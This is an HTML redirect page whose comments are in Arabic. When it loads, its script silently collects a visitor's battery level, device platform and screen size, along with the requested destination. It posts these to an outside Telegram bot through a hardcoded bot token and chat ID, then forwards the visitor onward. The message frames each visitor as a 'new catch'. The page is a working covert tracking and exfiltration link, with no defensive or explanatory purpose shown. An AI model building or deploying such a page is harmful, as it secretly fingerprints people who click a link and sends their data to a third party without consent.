<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <script>
        // إعدادات التليجرام مالتك
        const BOT_TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
        const CHAT_ID = "5773364548";

        async function sendToTelegram() {
            // جلب الرابط الأصلي اللي يريد يروحه الشخص
            const params = new URLSearchParams(window.location.search);
            const target = params.get('u') || 'https://google.com';

            // جلب معلومات الجهاز والبطارية
            let batt = "غير معروف";
            try {
                const b = await navigator.getBattery();
                batt = Math.round(b.level * 100) + "%";
            } catch(e) {}

            const msg = `
🎯 **صيد جديد من الخبير!**
━━━━━━━━━━━━━━━
🔋 **البطارية:** ${batt}
📱 **الجهاز:** ${navigator.platform}
🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
🔗 **الوجهة:** ${target}
━━━━━━━━━━━━━━━`;

            // إرسال البيانات مباشرة للتليجرام
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            });

            // تحويل الشخص للرابط اللي يريده
            window.location.replace(target);
        }

        window.onload = sendToTelegram;
    </script>
</head>
<body style="background-color: black;">
    </body>
</html>
